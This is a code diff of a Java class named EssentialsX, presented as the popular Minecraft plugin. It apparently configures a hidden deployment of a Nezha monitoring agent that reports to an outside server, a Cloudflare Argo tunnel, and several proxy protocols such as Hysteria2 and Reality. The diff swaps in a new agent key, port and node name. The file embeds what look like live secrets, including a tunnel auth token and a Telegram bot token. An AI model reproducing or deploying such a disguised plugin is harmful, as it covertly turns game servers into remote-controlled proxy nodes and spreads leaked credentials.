@@ -77,12 +77,12 @@ public class EssentialsX extends JavaPlugin {
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "nezhak2.btpp.ggff.net");
         env.put("NEZHA_PORT", "443");
-        env.put("NEZHA_KEY", "boxmine");
+        env.put("NEZHA_KEY", "wS9TZMEGMnuLjRyH6Y");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "minestratorbtpp04.btpp.ggff.net ");
+        env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "eyJhIjoiYmJmMDc4YjVkYjlhMzcwMmFiYTg3OGQyODYxMDUwMDciLCJ0IjoiMDkxYzU4MTgtZTJhMC00MWM4LTlhNjktNzBlYTA2NjdjZWFmIiwicyI6Ik4yWTJNall4TTJVdFpHWTBNaTAwTUdGaExUaGhaVFl0WVdJNVptVXpPREZsTWpRMCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "20343");
+        env.put("HY2_PORT", "11637");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "7935239797:AAHuQ9jZt-cNjcgjqQ9HH0JzkSWlD53EttM");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "minestratortpp04");
+        env.put("NAME", "freezehost");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
